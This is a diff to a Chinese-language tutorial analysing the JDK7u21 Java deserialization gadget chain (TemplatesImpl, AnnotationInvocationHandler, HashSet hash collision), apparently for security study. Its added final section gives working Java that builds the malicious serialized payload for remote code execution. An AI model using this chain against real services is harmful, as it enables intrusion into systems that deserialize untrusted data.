@@ -1,6 +1,6 @@
 # TemplatesImpl
 
-在理解JDK7U21前，需要先关注TemplatesImpl，由于调用其getOutputProperties可以加载字节码形式的class而导致任意代码执行的特性，所以许多Gadget都是围绕着如何调用TemplatesImpl.getOutputProperties()方法展开的，jdk7u21也是如此。
+在理解JDK7U21前，需要先了解TemplatesImpl，由于调用其getOutputProperties可以加载字节码形式的class而导致任意代码执行的特性，所以许多Gadget都是围绕着如何调用TemplatesImpl.getOutputProperties()方法展开的，比如fastjson反序列化的TemplatesImpl链是如此，本文主要内容JDK7U21也是如此。
 
 我们来看下TemplatesImpl的getOutputProperties：
 ```java
@@ -20,7 +20,7 @@ public synchronized Transformer newTransformer()
 {
     TransformerImpl transformer;
 
-    transformer = new TransformerImpl(getTransletInstance(), _outputProperties,
+    transformer = new TransformerImpl(getTransletInstance(), _outputProperties,  // 注意这里的getTransletInstance()，跟进
         _indentNumber, _tfactory);
 
     if (_uriResolver != null) {
@@ -38,7 +38,7 @@ public synchronized Transformer newTransformer()
 private Translet getTransletInstance()
     throws TransformerConfigurationException {
     try {
-        if (_name == null) return null; // 这里判断_name的值，因此构造需要给他赋值
+        if (_name == null) return null; // 这里判断_name的值，因此构造时需要给他赋值
 
         if (_class == null) defineTransletClasses(); // 跟进
 
@@ -73,7 +73,7 @@ private void defineTransletClasses()
         ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);
         throw new TransformerConfigurationException(err.toString());
     }
-    // 实例化一个classloader，此时，loader类型为TransletClassLoader
+    // 实例化一个classloader，此时，loader类型为TransletClassLoader，他是TemplatesImpl内部自己实现的一个子类
     TransletClassLoader loader = (TransletClassLoader)
         AccessController.doPrivileged(new PrivilegedAction() {
             public Object run() {
@@ -122,9 +122,9 @@ private void defineTransletClasses()
 ```java
 if (_class == null) defineTransletClasses(); // 完成_class赋值
 
-AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();  // 对_class进行实例化
+AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();  // 根据_transletIndex索引位置，对_class中的最后一个AbstractTranslet类进行实例化
 ```
-对任何类进行实例化，都必然会调用一个类的构造方法，因此我们只需要构造一个恶意类，在构造方法中写入命令执行之类的代码即可，正如上面代码注释所言，这个恶意类必须继承AbstractTranslet。
+我们知道，对大部分类进行实例化，都会调用他的构造方法，因此我们只需要构造一个恶意类，在构造方法中写入命令执行之类的代码即可，正如上面代码注释所言，这个恶意类必须继承AbstractTranslet。
 
 了解这些以后，我们就可以尝试构造代码来实现，首先构造恶意代码：
 ```java
@@ -158,10 +158,11 @@ public class Exploit extends AbstractTranslet {
 javac Exploit.java
 ```
 
-> 需要注意的是，此时的javac必须是与当前环境相同的jdk版本，由于当前环境的jdk版本为1.7，这在多jdk版本的PC环境下通常会出现问题，比如你的javac是jdk1.8或者jdk11的，而项目环境是jdk1.7，则后续调试环节会报错：`java.lang.UnsupportedClassVersionError: Unsupported major.minor version 52.0`（大致是loadClass环节），不过由于这个需求是一次性的，所以直接去jdk1.7的Home目录下找javac即可，MacOS的Path是：
+> 需要注意的是，此时的javac必须是与当前环境相同的jdk版本，由于本文讨论的是JDK7U21，所以当前项目环境的SDK为jdk1.7，这在多jdk版本的PC环境下通常会出现问题，比如你的javac命令是jdk1.8或者jdk11的，而项目环境是jdk1.7，则后续调试环节会报错：`java.lang.UnsupportedClassVersionError: Unsupported major.minor version 52.0`（大致是loadClass环节），不过由于这个需求是一次性的，所以直接去jdk1.7的Home目录下找javac即可，MacOS的Path是：
 ```
 /Library/Java/JavaVirtualMachines/jdk1.7.0_21.jdk/Contents/Home/bin/javac
 ```
+> 用这个javac来编译就不会出错
 
 然后构造测试demo：
 ```java
@@ -217,6 +218,8 @@ TemplatesImpl.getOutputProperties() -> newTransformer()
 
 > 插一句：直接调用newTransformer，效果和调用getOutputProperties是一样的。
 
+接下来的问题就是如何调用TemplatesImpl.getOutputProperties/newTransformer，这就引到了AnnotationInvocationHandler的讨论。
+
 # AnnotationInvocationHandler
 
 在CC1时，我们就已经接触到了AnnotationInvocationhandler，只不过当时关注点在Map.put/get这些方法的调用上，其实他的getMemberMethods方法也很有特点：
@@ -236,7 +239,7 @@ private Method[] getMemberMethods() {
     return this.memberMethods;
 }
 ```
-
+getMemberMethods方法会获取this.type的所有方法，并返回。这个方法被equalsImpl调用，我们来看下：
 
 ```java
 private Boolean equalsImpl(Object var1) {
@@ -278,7 +281,7 @@ private Boolean equalsImpl(Object var1) {
 结合上面代码，我们可以得出结论：
 1. this.type与var1必须同类型
 2. 只要调用equalsImpl方法，this.type的所有方法都会被调用
-3. 如果this.type是TemplatesImpl呢？不就可以调用getOutputProperties/newTransformer了？
+3. 如果this.type是Templates呢？不就可以调用getOutputProperties/newTransformer了？
 
 我们可以轻松构造demo验证：
 ```java
@@ -308,7 +311,9 @@ public class annotationInvocationHandler {
 ```java
 Object ahObject = constructor.newInstance(Templates.class, new HashMap<String, Object>());
 ```
-而不是TamplatesImpl.class，为什么？原因在于equalsImpl会调用所有方法，如果是TemplatesImpl，那么newTransformer/getOutputProperties的索引分别是13和14，压根执行不到这里就会报错退出了。而Templates只有两个方法，分别是newTransformer和getOutputProperties，这两个方法无论执行哪个都能rce。
+而不是TamplatesImpl.class，为什么会这样？
+
+原因在于：equalsImpl会调用所有方法，如果是TemplatesImpl，那么newTransformer/getOutputProperties的索引分别是13和14，压根执行不到这里就会报错退出了。而Templates只有两个方法，分别是newTransformer和getOutputProperties，这两个方法无论执行哪个都能rce。
 
 完整代码见于：`annotationInvocationHander.java`  
 
@@ -329,6 +334,7 @@ public Object invoke(Object var1, Method var2, Object[] var3) { // var1是被代
 }
 ```
 invoke方法在CC1中已经见过，当一个类被AnnotationInvocationHandler代理，那么他的任何方法调用都会先进入invoke方法。那么现在只要找到一个类，他在反序列化时会自动调用equals方法，我们只要对他进行动态代理，那么他执行equals方法时自然会进入AnnotationInvocationHandler.invoke方法，然后再调用equalsImpl，巴拉巴拉。  
+
 
 # HashSet
 
@@ -391,6 +397,7 @@ hashSet.add(templates);  // 被代理的Templates
 hashSet.add(new templatesImpl().getTmpl());  // 恶意TemplatesImpl对象
 ```
 因此本质上，我们需要保证被代理的Templates与恶意TemplatesImpl对象的hashCode值相等。
+(提前做个总结：被代理的Templates的hashCode()走的是AnnotationInvocationHandler.hashCodeImpl()，而恶意TemplatesImpl对象的hashCode走的是Object.hashCode，具体原因下面会分析)
 
 HashMap中计算hashCode主要是依靠hash方法，跟进看下：
 ```java
@@ -487,3 +494,50 @@ public static void bruteHashCode() {
 ```
 结果为：`f5a5a608`，ysoserial用的就是这个。
 
+# 汇总
+
+根据上面的分析总结，我们可以总结出反序列化的链为：
+```java
+HashSet.readObject() -> HashMap.put()  // HastSet反序列化，发现hashCode相同，触发比较
+    -> Templates.euqals() -> AnnotationInvocationHandler.invoke() -> equalsImpl() // equals被劫持，实际执行equalsImpl
+        -> getMemberMethods()  // 获取Templates所有方法
+        -> Method.invoke() => TemplatesImpl.getOutputProperties()  // 依次通过反射执行方法
+```
+
+按照这种思路，我们可以构造代码，首先创建一个HashSet，一个元素是恶意TemplatesImpl对象，另一个是被劫持的Templates。后者尤其需要注意一点：
+> AnnotationInvocationHandler对象构造时，需要定义this.memberValue，我们需要创建一个HashMap给他，里面只有一组KV，即：key=f5a5a608，value=恶意TemplatesImpl对象。
+
+然后序列化即可，怎么样，是不是很简单。
+
+demo大致如下：
+```java
+// 构造恶意TemplatesImpl对象
+TemplatesImpl tmpl = new TemplatesImpl();
+Field bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");
+bytecodes.setAccessible(true);
+byte[][] bytes = new byte[1][];
+bytes[0] = readClassFileToByteArray("/Users/jijue/Documents/GitHub/JavaUnserial/JDK7U21/src/main/java/Exploit.class");
+bytecodes.set(tmpl, bytes);
+Field name = TemplatesImpl.class.getDeclaredField("_name");
+name.setAccessible(true);
+name.set(tmpl, "Exploit1");
+
+// 构造memberValue
+HashMap hashMap = new HashMap();
+hashMap.put("f5a5a608",tmpl);
+
+// 创建AnnotationInvocationHandler
+Class<?> aClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+Constructor<?> constructor = aClass.getDeclaredConstructor(Class.class, Map.class);
+constructor.setAccessible(true);
+InvocationHandler aHandler = (InvocationHandler) constructor.newInstance(Templates.class,hashMap); // 设置this.type和this.memberValue
+// 代理Templates
+Templates templates = (Templates) Proxy.newProxyInstance(Override.class.getClassLoader(), new Class[]{Templates.class}, aHandler);
+
+// 创建HashSet，填入两个元素，两者hashCode保持动态一致
+HashSet hashSet = new HashSet();
+hashSet.add(templates);
+hashSet.add(tmpl);
+```
+
+具体代码见于：`GenJDK7U21.java`
